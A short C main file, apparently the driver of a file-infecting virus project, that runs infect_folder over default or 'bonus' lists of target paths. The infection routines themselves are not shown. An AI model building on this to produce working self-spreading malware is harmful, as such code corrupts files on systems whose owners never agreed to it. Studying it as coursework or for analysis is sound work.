#include "apocalypse.h"

static
void begin(const char **paths, size_t n, e_targets target, int recursive)
{
    for (size_t i = 0; i < n; i++)
        infect_folder(paths[i], target, recursive);
}

int main(int argc, char **argv)
{
    setup_emergency();
    if (argc > 1 && !strcmp(argv[1], "bonus"))
    {
        begin(BONUS_PATH,
              BONUS_COUNT,
              BONUS_TARGETS,
              BONUS_RECURSIVE);
    }
    else
    {
        begin(DEFAULT_PATH,
              DEFAULT_COUNT,
              DEFAULT_TARGETS,
              DEFAULT_RECURSIVE);
    }
    return 0;
}
